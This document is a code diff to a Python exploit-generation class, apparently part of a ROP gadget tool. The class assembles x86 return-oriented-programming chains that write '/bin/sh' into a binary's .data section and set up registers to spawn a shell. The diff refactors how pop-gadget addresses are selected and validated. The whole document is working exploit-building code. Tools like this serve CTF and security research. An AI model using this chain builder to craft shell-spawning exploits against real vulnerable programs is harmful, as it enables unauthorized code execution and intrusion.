@@ -10,8 +10,8 @@ def check_address(addr):
 
 def get_address(addrs):
     for addr in addrs:
-        if check_address(addr):
-            return addr
+        if check_address(addr["vaddr"]):
+            return addr["vaddr"]
     return None
 
 class ScriptMaker(object):
@@ -70,14 +70,16 @@ class ScriptMaker(object):
         if pop_level >= len(self.multi_pop) or pop_level<0:
             pop_level = 0
 
-        single_pops = {"eax" : self.pop_eax[0]["vaddr"],
-                       "ebx" : self.pop_ebx[0]["vaddr"],
-                       "ecx" : self.pop_ecx[0]["vaddr"],
-                       "edx" : self.pop_edx[1]["vaddr"]}        # THIS LINE SHOULD BE MODIFIED
+        single_pops = {"eax" : get_address(self.pop_eax),
+                       "ebx" : get_address(self.pop_ebx),
+                       "ecx" : get_address(self.pop_ecx),
+                       "edx" : get_address(self.pop_edx)
+                       }
+
         # Find .data section and write /bin/sh
         writeAddr = None
         for section in self.__Gadget.getDataSections():
-            if section["name"] == ".data":
+            if section["name"] == ".data" and check_address(section["vaddr"]):
                 writeAddr = section["vaddr"]
                 break
 
@@ -102,46 +104,22 @@ class ScriptMaker(object):
                     "edx": 0
                     }
 
-            if dstReg == "eax" and self.pop_eax:
-                worker = self.pop_eax[0]
-            elif dstReg == "ebx" and self.pop_ebx:
-                worker = self.pop_ebx[0]
-            elif dstReg == "ecx" and self.pop_ecx:
-                worker = self.pop_ecx[0]
-            elif dstReg == "edx" and self.pop_edx:
-                worker = self.pop_edx[1]            # THIS LINE SHOULD BE MODIFIED
-            elif dstReg == "esi" and self.pop_esi:
-                worker = self.pop_esi[0]
-            elif dstReg == "edi" and self.pop_edi:
-                worker = self.pop_edi[0]
-            else:
-                continue
+            worker = single_pops[dstReg]
+            mover = single_pops[srcReg]
 
-            if srcReg == "eax" and self.pop_eax:
-                mover = self.pop_eax[0]
-            elif srcReg == "ebx" and self.pop_ebx:
-                mover = self.pop_ebx[0]
-            elif srcReg == "ecx" and self.pop_ecx:
-                mover = self.pop_ecx[0]
-            elif srcReg == "edx" and self.pop_edx:
-                mover = self.pop_edx[0]
-            elif srcReg == "esi" and self.pop_esi:
-                mover = self.pop_esi[0]
-            elif srcReg == "edi" and self.pop_edi:
-                mover = self.pop_edi
-            else:
-                continue
+            if (worker is None) or (mover is None):
+                return None
 
             for pops in self.multi_pop[pop_level:]:
                 # put /bin
                 chain.append({
-                    "vaddr": mover["vaddr"],
+                    "vaddr": mover,
                     "value": [pStr("/bin")]
                     })
 
 
                 chain.append({
-                    "vaddr": worker["vaddr"],
+                    "vaddr": worker,
                     "value": [writeAddr]
                     })
                 chain.append({
@@ -150,11 +128,11 @@ class ScriptMaker(object):
                     })
                 # put /sh
                 chain.append({
-                    "vaddr": mover["vaddr"],
+                    "vaddr": mover,
                     "value": [pStr("/sh")]
                     })
                 chain.append({
-                    "vaddr": worker["vaddr"],
+                    "vaddr": worker,
                     "value": [writeAddr+4]
                     })
                 chain.append({
@@ -187,7 +165,7 @@ class ScriptMaker(object):
                             })
 
                 return chain
-        return []
+        return None
 
     def prepareChain(self, pop_level=0):
         chain = "chain  = \"\"" + "\n"
